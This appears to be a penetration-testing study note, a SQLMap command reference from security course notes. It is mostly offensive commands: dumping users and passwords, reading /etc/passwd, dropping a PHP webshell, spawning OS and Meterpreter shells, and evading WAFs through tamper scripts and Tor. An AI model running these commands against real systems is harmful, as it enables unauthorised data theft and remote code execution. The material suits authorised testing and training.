# SQLMap

**Tags:** `#sqlmap` `#sqli` `#database` `#webattacks` `#automation` `#enumeration` `#rce`

Automated SQL injection detection and exploitation tool. Detects and exploits all major SQLi types (boolean-blind, error-based, union, stacked, time-blind, inline) across 30+ database engines. Beyond data extraction, can read/write files and pop OS shells when the DB user has sufficient privileges.

**Source:** https://github.com/sqlmapproject/sqlmap — pre-installed on Kali
**Docs:** https://github.com/sqlmapproject/sqlmap/wiki/Usage

```bash
# Basic GET parameter test
sqlmap -u "http://target.com/page.php?id=1" --batch

# POST body
sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --batch
```

> [!note] **When to use SQLMap vs manual** — SQLMap is noisy (many requests) and sometimes misses injections in complex contexts. Start with manual testing to confirm injection exists, then hand off to SQLMap for extraction. Use `--technique` to limit noise when injection type is already known.

---

## Workflow

```text
1. Confirm the injection manually (a single ' / OR 1=1) — know it exists before firing sqlmap
2. Capture the exact request (Burp → Save item) → sqlmap -r request.txt  (mark the point with *)
3. Detect + fingerprint:   --batch  (--dbms=<X> if known)  (--level/--risk as needed)
4. Enumerate:              --banner --current-user --is-dba --privileges → --dbs → -D db --tables → --dump
5. Escalate (if DBA):      --file-read / --file-write / --os-shell
6. Stuck? tune detection (--string / --code / --technique) or bypass a WAF (--tamper)
```

> [!tip] `--batch` accepts every default prompt — essential for scripting, but read what it auto-answers the first time (it picks the DBMS, skips other params, declines hash-cracking). Pair with `--flush-session` after you change the request so it re-tests cleanly instead of trusting a cached result.

---

## Target Specification

```bash
# GET parameter
sqlmap -u "http://target.com/vuln.php?id=1"

# POST body
sqlmap -u "http://target.com/login" --data "uid=1&pass=test"

# POST with specific injection point marker (*)
sqlmap -u "http://target.com/login" --data "uid=1*&pass=test"

# From saved Burp request file
sqlmap -r request.txt

# PUT method
sqlmap -u "http://target.com/api/item" --data "id=1" --method PUT

# Cookie injection (requires --level=2+)
sqlmap -u "http://target.com/" --cookie "session=abc; id=1*" --level=2

# Custom header injection
sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1*"

# JSON body
sqlmap -u "http://target.com/api" --data '{"id":"1*"}' --content-type "application/json"
```

---

## Parameter Targeting & Auto-Discovery

```bash
# Test only a specific parameter (skip the rest — faster and quieter)
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Skip specific parameters (anti-CSRF, viewstate, etc.)
sqlmap -r request.txt --skip "csrf,__VIEWSTATE"

# Mark the exact injection point with * — works in -r files, URLs, headers, and cookies
sqlmap -r request.txt          # request.txt contains ...id=1*...

# Auto-submit and test every form on a page
sqlmap -u "http://target.com/search" --forms --batch

# Crawl the site to depth N and test what it finds
sqlmap -u "http://target.com/" --crawl=2 --batch

# Many targets from a file (one URL per line) / from a Google dork
sqlmap -m targets.txt --batch
sqlmap -g "inurl:php?id=" --batch
```

> [!warning] With `-r <file>` do **not** also pass `-u`/`--data` — the request file already carries the method, URL, headers, and body; put the `*` marker inside it. Mixing them is the #1 cause of "sqlmap tested the wrong thing."

---

## Authentication & Session

```bash
# Cookie
sqlmap -u "http://target.com/page?id=1" --cookie "PHPSESSID=abc123"

# HTTP Basic auth
sqlmap -u "http://target.com/page?id=1" --auth-type Basic --auth-cred "admin:password"

# Proxy through Burp
sqlmap -u "http://target.com/page?id=1" --proxy http://127.0.0.1:8080

# SOCKS proxy
sqlmap -u "http://target.com/page?id=1" --proxy socks5://127.0.0.1:1080

# Custom User-Agent (avoid SQLMap fingerprint)
sqlmap -u "http://target.com/page?id=1" --random-agent
```

---

## Detection Tuning

```bash
# Level (1-5): controls number of payloads tested — default 1, use 5 for thorough
# Risk (1-3): controls payload aggressiveness — default 1, use 3 for more (may modify data)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Specify injection technique (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
sqlmap -u "http://target.com/page?id=1" --technique=BEU

# Force UNION-based with known column count
sqlmap -u "http://target.com/page?id=1" --technique=U --union-cols=5

# Specify DBMS (skip fingerprinting)
sqlmap -u "http://target.com/page?id=1" --dbms=MySQL
sqlmap -u "http://target.com/page?id=1" --dbms=mssql

# Prefix/suffix for injection context
sqlmap -u "http://target.com/page?id=1" --prefix="')" --suffix="-- -"

# Add delay between requests (avoid rate limiting)
sqlmap -u "http://target.com/page?id=1" --delay=1

# Threads (default 1)
sqlmap -u "http://target.com/page?id=1" --threads=5
```

**What each level / risk actually adds:**

| Level | Adds | | Risk | Adds |
|---|---|---|---|---|
| 1 (default) | GET/POST params | | 1 (default) | Safe payloads |
| ≥2 | HTTP **Cookie** header | | 2 | Heavy **time-based** payloads |
| ≥3 | **User-Agent / Referer** | | 3 | **OR-based** payloads — can modify rows (risky) |
| 4–5 | more payloads; Host (5) | | | |

**Injection techniques (`--technique`, default `BEUSTQ`):**

| Letter | Technique | When / what it needs |
|---|---|---|
| `B` | Boolean-based blind | Response differs on true vs false; no data echoed back |
| `E` | Error-based | DBMS error text is reflected in the response — fast extraction |
| `U` | UNION query | Injectable into a `SELECT` with a matchable column count — fastest bulk dump |
| `S` | Stacked queries | `;`-separated statements; **required for `--os-shell`, `--file-write`, and any write/DML** |
| `T` | Time-based blind | Infers data via `SLEEP()` / delays; slowest, works with zero output |
| `Q` | Inline query | Result embedded inside the original query's output |

> [!tip] Restrict to what you need — `--technique=U` for a clean UNION dump, `--technique=T` when only time-based fires. **Stacked queries (`S`) is the gate for RCE / file-write**, so if `--os-shell` fails, first confirm the target actually supports `S`.

### When sqlmap can't tell true from false (blind)

Boolean-blind sometimes needs you to define the "true" signal:

```bash
sqlmap -u "..." --string "Welcome back"     # text present only on TRUE
sqlmap -u "..." --not-string "Invalid"      # text present only on FALSE
sqlmap -u "..." --code=200                   # distinguish by HTTP status
sqlmap -u "..." --titles                     # distinguish by <title>
sqlmap -u "..." --text-only                  # compare visible text, ignore markup
sqlmap -u "..." --technique=T --time-sec=10  # time-based: raise delay on jittery links
sqlmap -u "..." --parse-errors               # surface DBMS errors sqlmap would hide
```

---

## Second-Order Injection

When the payload is stored on one request but only executed/rendered on a **different** page, point sqlmap at that second request:

```bash
# Inject on the first request; read the boolean/time signal from another URL
sqlmap -r register.txt --second-url "http://target.com/profile"

# Or supply the full second request from a file (its own headers/cookies)
sqlmap -r register.txt --second-req profile_request.txt
```

> [!note] Classic case: a **registration / update** form stores your injected value, and it only reaches SQL when an **admin or profile** page later renders it. `--second-*` makes sqlmap re-check that page after every payload.

---

## Enumeration

```bash
# Banner, current user, current DB, DBA check
sqlmap -u "http://target.com/page?id=1" --batch --banner --current-user --current-db --is-dba

# What can this user DO? — privileges, roles, and the full user list
sqlmap -u "http://target.com/page?id=1" --batch --privileges -U CU   # current user's privileges (CU = current user)
sqlmap -u "http://target.com/page?id=1" --batch --privileges          # privileges of every DB user
sqlmap -u "http://target.com/page?id=1" --batch --roles               # user roles (Oracle and others)
sqlmap -u "http://target.com/page?id=1" --batch --users               # list all DBMS users

# List all databases
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# List tables in a database
sqlmap -u "http://target.com/page?id=1" --batch --tables -D targetdb

# List columns in a table
sqlmap -u "http://target.com/page?id=1" --batch --columns -T users -D targetdb

# Dump a table
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb

# Dump specific columns only
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb -C username,password

# Conditional dump
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb --where "admin=1"

# Row range (avoid dumping everything)
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users --start=1 --stop=10

# Full schema
sqlmap -u "http://target.com/page?id=1" --batch --schema

# Search for table/column by name
sqlmap -u "http://target.com/page?id=1" --batch --search -T user
sqlmap -u "http://target.com/page?id=1" --batch --search -C password

# Dump all DB passwords (and attempt crack)
sqlmap -u "http://target.com/page?id=1" --batch --passwords
```

> [!tip] **Privileges decide your escalation path.** `--is-dba` true → go for `--os-shell`. In `--privileges` output look specifically for **`FILE`** (MySQL) / **superuser** (PostgreSQL) / **sysadmin** (MSSQL) — that's what gates `--file-read`, `--file-write`, and OS command exec. No DBA/FILE → you're limited to data extraction.

---

## File Read / Write

```bash
# Read file (requires FILE privilege)
sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-read "C:/Windows/System32/drivers/etc/hosts"

# Write file (requires FILE privilege + write access to path)
sqlmap -u "http://target.com/page?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

---

## OS Shell & Command Execution

```bash
# Interactive OS shell (requires stacked queries + FILE/xp_cmdshell/UDF)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Interactive SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Single OS command
sqlmap -u "http://target.com/page?id=1" --os-cmd "whoami"

# Meterpreter session (MSSQL / MySQL with write access)
sqlmap -u "http://target.com/page?id=1" --os-pwn

# Run one arbitrary SQL query (vs the interactive --sql-shell)
sqlmap -u "http://target.com/page?id=1" --sql-query "SELECT @@version"
```

`--os-shell` needs **stacked queries** (the `S` technique) *or* a DBMS-specific privileged primitive. What it actually does per engine:

| DBMS | How `--os-shell` gets code exec | Needs |
|---|---|---|
| **MSSQL** | Re-enables + calls `xp_cmdshell` via `sp_configure` | `sa` / sysadmin |
| **MySQL** | UDF (`lib_mysqludf_sys` → `sys_exec`) into the plugin dir, or `INTO OUTFILE` a webshell to the web root | `FILE` priv; `secure_file_priv` unset; known web root |
| **PostgreSQL** | `COPY … FROM PROGRAM` (**CVE-2019-9193**, 9.3–11.2) or a `plpythonu` function | superuser / `pg_execute_server_program` |
| **Oracle** | Java stored proc / `DBMS_SCHEDULER` — fiddly, often manual | elevated privs |

> [!warning] `--os-shell` / `--os-pwn` write files and register functions on the target (UDF `.so`/`.dll`, dropped webshells) — noisy and they leave artifacts. Confirm RCE is in scope and clean up after.

---

## WAF / Filter Bypass — Tamper Scripts

```bash
# List all available tamper scripts
sqlmap --list-tampers

# Use a tamper script
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=base64encode

# Common tamper combos for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --random-agent
```

| Tamper | Effect |
|---|---|
| `space2comment` | Replaces spaces with `/**/` |
| `between` | Replaces `>` with `NOT BETWEEN` and `=` with `BETWEEN` |
| `randomcase` | Randomizes keyword case (`SELECT` → `SeLeCt`) |
| `base64encode` | Base64-encodes entire payload |
| `0eunion` | Replaces `UNION` with `e0UNION` |
| `percentage` | Adds `%` before each char (`SELECT` → `%S%E%L%E%C%T`) |
| `space2dash` | Replaces spaces with `-- X\n` comment |
| `plus2concat` | Replaces `+` with MSSQL `CONCAT()` |
| `versionedkeywords` | Wraps keywords in MySQL versioned comments |
| `charencode` | URL-encodes every character |
| `charunicodeencode` | Unicode-URL-encodes (ASP/.NET stacks) |
| `apostrophemask` | Replaces `'` with UTF-8 fullwidth `%EF%BC%87` |
| `equaltolike` | Replaces `=` with `LIKE` |
| `greatest` / `least` | Rewrites `>`/`<` using `GREATEST()`/`LEAST()` |
| `space2mysqlblank` | Spaces → other blank chars MySQL accepts |
| `modsecurityversioned` | MySQL versioned-comment trick vs ModSecurity |
| `space2hash` | Spaces → MySQL `#` comment + newline |

> [!tip] **Choose tampers by DBMS + WAF, don't shotgun.** `sqlmap --list-tampers` shows each script's target DBMS — fingerprint first (`--dbms`), then chain 2–3 relevant ones. Too many tampers mangle the payload and *hurt* detection. Against rate-based WAFs, `--random-agent` + `--delay` + `--safe-url` often help more than stacking tampers.

---

## CSRF Token Handling

```bash
# Tell SQLMap about the CSRF token parameter
sqlmap -u "http://target.com/form" --data "id=1&csrf=TOKENVALUE" --csrf-token="csrf"

# Randomized hash parameter (SQLMap evaluates Python to generate it)
sqlmap -u "http://target.com/page?id=1" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"
```

---

## Output & Logging

```bash
# Store raw traffic to file
sqlmap -u "http://target.com/page?id=1" --traffic-file /tmp/traffic.txt

# Verbose output (1-6, default 1)
sqlmap -u "http://target.com/page?id=1" -v 3

# Results saved to: ~/.local/share/sqlmap/output/<target>/
```

---

## Direct DB Connection (no web app)

Already have DB creds? Skip the injection layer — the same enumeration and `--os-shell` engine runs against a direct connection:

```bash
sqlmap -d "mysql://user:pass@10.10.10.5:3306/appdb" --dump -T users
sqlmap -d "postgresql://postgres:pass@10.10.10.5:5432/postgres" --os-shell
```

---

## Anonymity & Stealth

```bash
sqlmap -u "..." --random-agent                 # rotate a real browser UA (drop the sqlmap fingerprint)
sqlmap -u "..." --delay=2 --threads=1          # slow + single-threaded = quieter
sqlmap -u "..." --safe-url="http://t/home" --safe-freq=5   # hit a benign URL every 5 reqs (keep session / dodge lockout)
sqlmap -u "..." --tor --tor-type=SOCKS5 --check-tor
sqlmap -u "..." --skip-waf                      # skip the WAF-detection probe (itself noisy)
sqlmap -u "..." --chunked                       # split payloads across chunked-encoded bodies
```

---

## Session, Caching & Gotchas

```bash
# sqlmap caches everything under ~/.local/share/sqlmap/output/<host>/
sqlmap -u "..." --flush-session                 # clear cached findings — re-test cleanly
sqlmap -u "..." --fresh-queries                 # ignore cached query RESULTS, re-run them
sqlmap -u "..." --answers="crack=N,dict=N"      # pre-answer specific prompts under --batch
```

- **Stale session** is the classic footgun — sqlmap "remembers" a prior injection point/DBMS; after changing the request or params, add `--flush-session`.
- `--batch` silently picks defaults (DBMS guess, "skip other params", "don't crack hashes") — run once *without* it to see the questions.
- Garbled dumps on odd charsets → `--hex`; huge tables → `--start/--stop` or `--where`; everything but system DBs → `--dump-all --exclude-sysdbs`.

---

## Quick Reference

| Goal | Command |
|---|---|
| Test a Burp request | `sqlmap -r req.txt --batch` (mark point with `*`) |
| Target one parameter | `sqlmap -u "...?a=1&b=2" -p b` |
| Thorough + aggressive | `sqlmap -r req.txt --level=5 --risk=3` |
| Am I DBA? | `sqlmap -r req.txt --is-dba --current-user --banner` |
| Dump a table | `sqlmap -r req.txt --dump -T users -D app -C user,pass` |
| Find creds anywhere | `sqlmap -r req.txt --search -C pass,password,secret` |
| Read a file | `sqlmap -r req.txt --file-read /etc/passwd` |
| OS shell | `sqlmap -r req.txt --os-shell` |
| Blind, custom oracle | `sqlmap -r req.txt --string "Welcome"` |
| Beat a WAF | `sqlmap -r req.txt --tamper=between,space2comment --random-agent` |
| Second-order | `sqlmap -r reg.txt --second-url http://t/profile` |
| Direct DB | `sqlmap -d "mysql://u:p@host:3306/db" --dump` |
| Clean re-test | append `--flush-session` |

---

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Non-PHP Web App Attacks|Non-PHP Web App Attacks]] (CPTS v2). Also [[Class notes/HTB Academy/CWES Claude/API Attacks|API Attacks]] (CWES) — SQL injection in API endpoints.

---

*Created: 2026-03-06*
*Updated: 2026-07-31*
*Model: claude-opus-4-8*
